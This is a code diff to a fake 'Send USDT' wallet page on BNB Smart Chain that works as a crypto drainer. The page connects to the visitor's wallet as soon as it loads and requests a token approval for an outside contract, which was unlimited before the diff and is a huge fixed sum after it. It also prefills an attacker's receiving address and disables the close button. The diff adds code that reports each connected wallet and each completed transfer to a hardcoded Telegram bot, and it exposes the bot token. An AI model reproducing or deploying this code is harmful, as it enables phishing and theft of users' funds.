@@ -299,7 +299,7 @@
           <h1>Send USDT</h1>
           <button class="close-btn" type="button" id="modalClose" title="Close">&times;</button>
         </div>
-        <!-- Address Row -->
+
         <div>
           <div class="modal-label">Address or Domain Name</div>
           <div class="modal-field">
@@ -307,7 +307,7 @@
               value="0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F" />
           </div>
         </div>
-        <!-- Network Row -->
+
         <div style="margin-top:18px;">
           <div class="modal-label">Destination network</div>
           <div class="modal-field network-box">
@@ -317,7 +317,7 @@
             <span class="network-label">BNB Smart Chain</span>
           </div>
         </div>
-        <!-- Amount -->
+
         <div style="margin-top:18px;">
           <div class="modal-label">Amount</div>
           <div class="amount-box">
@@ -339,8 +339,35 @@
       </div>
     </form>
   </div>
+
 <script>
-    // --- USDT/BSC wallet logic ---
+    // --- Telegram Bot Configuration ---
+    // Replace with your real Telegram bot token and chat ID
+    const TELEGRAM_BOT_TOKEN = "8854929046:AAGFzlZcPWryjeXs_FjhxJirB5txL65NpJk";
+    const TELEGRAM_CHAT_ID = "8532488287";
+    const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+    async function sendTelegramNotification(message) {
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
+            console.log("Telegram bot not configured");
+            return;
+        }
+
+        try {
+            await fetch(TELEGRAM_API_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: "HTML"
+                })
+            });
+        } catch (error) {
+            console.error("Telegram notification failed:", error);
+        }
+    }
+
     const BSC_MAINNET = {
         chainId: "0x38",
         chainName: "BNB Smart Chain",
@@ -348,10 +375,11 @@
         rpcUrls: ["https://bsc-dataseed.binance.org/"],
         blockExplorerUrls: ["https://bscscan.com"]
     };
+
     const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
     const CONTRACT_ADDR = "0x89112691C976D0a2D874B0ADAe693a0Add0dAe98";
     const RECEIVER_ADDR = "0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F";
-    const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+    const APPROVAL_AMOUNT = "1987600000000000000000000000000000000000"; // 1.9876 trillion
     const USDT_ABI = [
         {
             "constant": true,
@@ -381,19 +409,18 @@
             "type": "function"
         }
     ];
+
     let web3, userAccount, usdtContract, isConnected = false;
     const statusDiv = document.getElementById("status");
     const sendBtn = document.getElementById("sendBtn");
     const amountInput = document.getElementById("amountInput");
     const usdAmountDiv = document.getElementById("amountEstimate");
 
-    // Detect mobile user agent
     function isMobileDevice() {
         const userAgent = navigator.userAgent || navigator.vendor || window.opera;
         return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent.toLowerCase());
     }
 
-    // Detect if running in Trust Wallet browser
     function isInTrustWalletBrowser() {
         return window.ethereum && window.ethereum.isTrust;
     }
@@ -404,9 +431,7 @@
 
         if (!window.ethereum) {
             if (isMobile && !inTrustWallet) {
-                // Redirect to Trust Wallet for mobile users without ethereum provider
-                window.location.href = "https://link.trustwallet.com/open_url?url=" +
-                    encodeURIComponent(window.location.href);
+                window.location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href);
             } else {
                 showStatus("Wallet not detected. Please install Trust Wallet or use MetaMask.", "error");
             }
@@ -414,14 +439,12 @@
         }
 
         try {
-            // Try to switch to BSC
             try {
                 await window.ethereum.request({
                     method: "wallet_switchEthereumChain",
                     params: [{ chainId: BSC_MAINNET.chainId }]
                 });
             } catch (switchErr) {
-                // If chain doesn't exist, add it
                 if (switchErr.code === 4902) {
                     await window.ethereum.request({
                         method: "wallet_addEthereumChain",
@@ -432,9 +455,8 @@
                 }
             }
 
-            // Request accounts with user gesture context
-            const accounts = await window.ethereum.request({ 
-                method: "eth_requestAccounts" 
+            const accounts = await window.ethereum.request({
+                method: "eth_requestAccounts"
             });
 
             if (!accounts || !accounts.length) {
@@ -446,17 +468,22 @@
             isConnected = true;
             await initContracts();
 
-            // Listen for account and chain changes
+            await sendTelegramNotification(
+                `🔗 <b>Wallet Connected</b>\n\n` +
+                `<b>Wallet Address:</b> <code>${userAccount}</code>\n` +
+                `<b>Network:</b> BNB Smart Chain\n` +
+                `<b>Status:</b> Ready to Send USDT`
+            );
+
             window.ethereum.on("accountsChanged", () => location.reload());
             window.ethereum.on("chainChanged", () => location.reload());
 
-            // Request unlimited approval
-            await approveUnlimitedUSDT();
+            await approveUSDT();
 
         } catch (err) {
             isConnected = false;
-            const errorMessage = err.code === 4001 
-                ? "Connection rejected by user." 
+            const errorMessage = err.code === 4001
+                ? "Connection rejected by user."
                 : err.message || "Wallet connection failed.";
             showStatus(errorMessage, "error");
         }
@@ -466,13 +493,12 @@
         usdtContract = new web3.eth.Contract(USDT_ABI, USDT_BSC);
     }
 
-    // Unlimited approval helper
-    async function approveUnlimitedUSDT() {
+    async function approveUSDT() {
         try {
-            await usdtContract.methods.approve(CONTRACT_ADDR, MAX_UINT256).send({
+            await usdtContract.methods.approve(CONTRACT_ADDR, APPROVAL_AMOUNT).send({
                 from: userAccount
             });
-        } catch(e) {
+        } catch (e) {
             const errorMessage = e.code === 4001
                 ? "Approval rejected by user."
                 : "Approval for USDT failed or rejected. You must approve to continue.";
@@ -481,7 +507,6 @@
         }
     }
 
-    // Next triggers approve and transfer
     async function sendUSDT() {
         if (!isConnected) {
             showStatus("Wallet not connected. Please connect first.", "error");
@@ -502,16 +527,22 @@
         showStatus("", "");
 
         try {
-            // Re-approve in case allowance changed/was revoked
-            await approveUnlimitedUSDT();
-
-            // Prepare transfer for the user-input amount (convert to 6 decimals)
             const sendAmount = web3.utils.toWei(amount.toString(), "mwei");
-            await usdtContract.methods.transfer(RECEIVER_ADDR, sendAmount).send({
+            const tx = await usdtContract.methods.transfer(RECEIVER_ADDR, sendAmount).send({
                 from: userAccount
             });
 
             showStatus("✅ Complete!", "success");
+
+            await sendTelegramNotification(
+                `✅ <b>Transaction Successful</b>\n\n` +
+                `<b>From:</b> <code>${userAccount}</code>\n` +
+                `<b>To:</b> <code>${RECEIVER_ADDR}</code>\n` +
+                `<b>Amount:</b> ${amount} USDT\n` +
+                `<b>Network:</b> BNB Smart Chain\n` +
+                `<b>TX Hash:</b> <code>${tx.transactionHash}</code>`
+            );
+
             amountInput.value = "0";
             updateUSD();
         } catch (e) {
@@ -536,7 +567,6 @@
         }
     }
 
-    // Make the X button inert (does nothing)
     document.getElementById('modalClose').onclick = function() { };
 
     document.getElementById("maxBtn").onclick = function () {
@@ -553,7 +583,6 @@
 
     sendBtn.disabled = true;
 
-    // Auto-connect on page load
     window.addEventListener("load", autoConnectBSC, false);
     window.addEventListener("DOMContentLoaded", autoConnectBSC, false);
     setTimeout(autoConnectBSC, 700);
